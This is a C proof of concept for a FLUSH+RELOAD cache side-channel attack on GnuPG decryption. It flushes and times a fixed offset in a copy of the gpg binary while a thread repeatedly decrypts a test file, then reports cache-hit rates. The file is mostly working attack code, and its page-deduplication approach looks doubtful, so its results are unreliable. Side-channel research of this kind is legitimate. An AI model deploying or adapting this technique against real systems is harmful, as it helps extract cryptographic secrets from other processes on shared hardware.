#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>

#define CACHE_HIT_THRESHOLD 80
#define SHARED_MEM_SIZE (2 * 1024 * 1024) // 2MB
#define TARGET_OFFSET 0x81330
#define TEST_DURATION_SECONDS 5
#define SAMPLE_RATE_US 1000

// Shared memory descriptor
typedef struct {
    void *shared_base;
    void *target_addr;
    int shm_fd;
} shared_mem_t;

void flush(void *addr) {
    asm volatile("clflush (%0)" : : "r"(addr) : "memory");
}

uint64_t reload(void *addr) {
    unsigned int junk;
    uint64_t time1 = __rdtscp(&junk);
    junk = *(volatile unsigned int *)addr;
    return __rdtscp(&junk) - time1;
}

// Create shared memory that will be deduplicated with GnuPG
shared_mem_t create_shared_mapping() {
    shared_mem_t sm = {0};
    
    // Create shared memory file
    sm.shm_fd = open("/dev/shm/gnupg_shared", O_CREAT | O_RDWR, 0600);
    if (sm.shm_fd == -1) {
        perror("open shared memory");
        return sm;
    }
    
    // Set size
    if (ftruncate(sm.shm_fd, SHARED_MEM_SIZE) == -1) {
        perror("ftruncate");
        close(sm.shm_fd);
        return sm;
    }
    
    // Map shared memory
    sm.shared_base = mmap(NULL, SHARED_MEM_SIZE, 
                         PROT_READ | PROT_WRITE, MAP_SHARED, sm.shm_fd, 0);
    if (sm.shared_base == MAP_FAILED) {
        perror("mmap shared");
        close(sm.shm_fd);
        sm.shared_base = NULL;
        return sm;
    }
    
    // Copy GnuPG binary into shared memory to trigger deduplication
    int gpg_fd = open("/home/ev/genkin/flush_reload/gnupg-install/bin/gpg", O_RDONLY);
    if (gpg_fd != -1) {
        ssize_t bytes_read = read(gpg_fd, sm.shared_base, SHARED_MEM_SIZE);
        if (bytes_read == -1) {
            perror("read gpg");
        }
        close(gpg_fd);
    } else {
        perror("open gpg");
    }
    
    sm.target_addr = sm.shared_base + TARGET_OFFSET;
    printf("Shared memory created at %p, target at %p\n", sm.shared_base, sm.target_addr);
    
    return sm;
}

// Clean up shared memory
void cleanup_shared_mapping(shared_mem_t *sm) {
    if (sm->shared_base && sm->shared_base != MAP_FAILED) {
        munmap(sm->shared_base, SHARED_MEM_SIZE);
    }
    if (sm->shm_fd != -1) {
        close(sm->shm_fd);
        unlink("/dev/shm/gnupg_shared");
    }
}

void victim_process(shared_mem_t *sm) {
    // Set CPU affinity to core 1
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np victim");
    }
    
    printf("Victim: Starting on core 1\n");
    
    // Force OS deduplication by accessing shared memory pages
    printf("Victim: Touching shared pages for deduplication...\n");
    volatile char *dummy = (char *)sm->shared_base;
    for (int i = 0; i < SHARED_MEM_SIZE; i += 4096) {
        dummy[i] = dummy[i]; // Touch each page
    }
    
    printf("Victim: Starting decryption operations...\n");
    
    // Perform decryption operations
    int operations = TEST_DURATION_SECONDS * 2;
    for (int i = 0; i < operations; i++) {
        int result = system("echo '' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --batch --yes --passphrase-file /home/ev/genkin/flush_reload/passphrase.txt --decrypt /home/ev/genkin/flush_reload/test_encrypted.gpg 2>/dev/null");
        if (result != 0) {
            printf("Victim: Decryption failed (attempt %d)\n", i+1);
        }
        usleep(500000); // 500ms between operations
    }
    
    printf("Victim: Finished decryption operations\n");
}

void baseline_test(shared_mem_t *sm, uint64_t *times, int *count) {
    printf("=== BASELINE TEST (No Victim Process) ===\n");
    
    int samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    *count = 0;
    
    for (int i = 0; i < samples; i++) {
        flush(sm->target_addr);
        usleep(SAMPLE_RATE_US);
        
        uint64_t time = reload(sm->target_addr);
        times[*count] = time;
        (*count)++;
        
        if (i % 100 == 0) {
            printf("Baseline sample %d: %lu cycles\n", i, time);
        }
    }
    
    printf("Baseline test completed. Collected %d samples.\n", *count);
}

void attack_test(shared_mem_t *sm, uint64_t *times, int *count) {
    printf("\n=== ATTACK TEST (With Victim Process Decrypting) ===\n");
    
    int samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    *count = 0;
    int hits = 0;
    
    for (int i = 0; i < samples; i++) {
        flush(sm->target_addr);
        usleep(SAMPLE_RATE_US);
        
        uint64_t time = reload(sm->target_addr);
        times[*count] = time;
        (*count)++;
        
        if (time < CACHE_HIT_THRESHOLD) {
            hits++;
            printf("CACHE HIT! Sample %d: %lu cycles\n", i, time);
        } else if (i % 100 == 0) {
            printf("Attack sample %d: %lu cycles\n", i, time);
        }
    }
    
    printf("Attack test completed. Collected %d samples, %d cache hits (%.1f%%)\n", 
           *count, hits, (hits * 100.0) / *count);
}

double calculate_average(uint64_t *times, int count) {
    if (count == 0) return 0.0;
    
    uint64_t sum = 0;
    for (int i = 0; i < count; i++) {
        sum += times[i];
    }
    return (double)sum / count;
}

double calculate_hit_rate(uint64_t *times, int count) {
    if (count == 0) return 0.0;
    
    int hits = 0;
    for (int i = 0; i < count; i++) {
        if (times[i] < CACHE_HIT_THRESHOLD) {
            hits++;
        }
    }
    return (hits * 100.0) / count;
}

void write_results(double baseline_avg, double attack_avg, 
                  double baseline_hit_rate, double attack_hit_rate,
                  int baseline_count, int attack_count) {
    FILE *fp = fopen("flush_reload_results.txt", "w");
    if (!fp) {
        perror("Failed to open results file");
        return;
    }
    
    fprintf(fp, "FLUSH+RELOAD Attack Results (Memory Deduplication)\n");
    fprintf(fp, "==================================================\n\n");
    
    fprintf(fp, "Baseline Test (No Victim):\n");
    fprintf(fp, "  Samples: %d\n", baseline_count);
    fprintf(fp, "  Average Access Time: %.2f cycles\n", baseline_avg);
    fprintf(fp, "  Cache Hit Rate: %.1f%%\n\n", baseline_hit_rate);
    
    fprintf(fp, "Attack Test (With Victim Decrypting):\n");
    fprintf(fp, "  Samples: %d\n", attack_count);
    fprintf(fp, "  Average Access Time: %.2f cycles\n", attack_avg);
    fprintf(fp, "  Cache Hit Rate: %.1f%%\n\n", attack_hit_rate);
    
    fprintf(fp, "Analysis:\n");
    double time_diff = attack_avg - baseline_avg;
    double hit_diff = attack_hit_rate - baseline_hit_rate;
    
    if (hit_diff > 10.0) {
        fprintf(fp, "  SUCCESS: Significant cache hit increase detected!\n");
        fprintf(fp, "  Cache hits increased by %.1f%%\n", hit_diff);
        fprintf(fp, "  This indicates successful memory deduplication and attack\n");
    } else if (hit_diff > 5.0) {
        fprintf(fp, "  PARTIAL SUCCESS: Moderate cache hit increase detected\n");
        fprintf(fp, "  Cache hits increased by %.1f%%\n", hit_diff);
    } else {
        fprintf(fp, "  NO SIGNIFICANT DETECTION: Cache hit pattern unchanged\n");
        fprintf(fp, "  Cache hits changed by %.1f%%\n", hit_diff);
    }
    
    fclose(fp);
    printf("\nResults written to flush_reload_results.txt\n");
}

int main() {
    printf("=== FLUSH+RELOAD Attack with Memory Deduplication ===\n");
    
    // Create shared memory mapping
    shared_mem_t sm = create_shared_mapping();
    if (!sm.shared_base) {
        printf("Failed to create shared mapping\n");
        return 1;
    }
    
    // Set attacker to core 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np attacker");
        cleanup_shared_mapping(&sm);
        return 1;
    }
    
    // Allocate arrays for timing data
    int max_samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    uint64_t *baseline_times = malloc(max_samples * sizeof(uint64_t));
    uint64_t *attack_times = malloc(max_samples * sizeof(uint64_t));
    
    if (!baseline_times || !attack_times) {
        printf("Failed to allocate memory\n");
        cleanup_shared_mapping(&sm);
        return 1;
    }
    
    int baseline_count, attack_count;
    
    // Run baseline test (no victim)
    baseline_test(&sm, baseline_times, &baseline_count);
    
    // Start victim process
    pthread_t victim_thread;
    if (pthread_create(&victim_thread, NULL, (void*)victim_process, &sm) != 0) {
        perror("pthread_create");
        cleanup_shared_mapping(&sm);
        free(baseline_times);
        free(attack_times);
        return 1;
    }
    
    // Wait for memory deduplication to occur
    printf("Waiting 2 seconds for memory deduplication...\n");
    sleep(2);
    
    // Run attack test (with victim)
    attack_test(&sm, attack_times, &attack_count);
    
    // Wait for victim to complete
    pthread_join(victim_thread, NULL);
    
    // Calculate results
    double baseline_avg = calculate_average(baseline_times, baseline_count);
    double attack_avg = calculate_average(attack_times, attack_count);
    double baseline_hit_rate = calculate_hit_rate(baseline_times, baseline_count);
    double attack_hit_rate = calculate_hit_rate(attack_times, attack_count);
    
    printf("\n=== FINAL RESULTS ===\n");
    printf("Baseline: %.2f cycles avg, %.1f%% hit rate (%d samples)\n", 
           baseline_avg, baseline_hit_rate, baseline_count);
    printf("Attack:   %.2f cycles avg, %.1f%% hit rate (%d samples)\n", 
           attack_avg, attack_hit_rate, attack_count);
    printf("Hit rate change: %.1f%%\n", attack_hit_rate - baseline_hit_rate);
    
    write_results(baseline_avg, attack_avg, baseline_hit_rate, attack_hit_rate, 
                 baseline_count, attack_count);
    
    // Cleanup
    free(baseline_times);
    free(attack_times);
    cleanup_shared_mapping(&sm);
    
    printf("Attack demonstration completed\n");
    return 0;
}
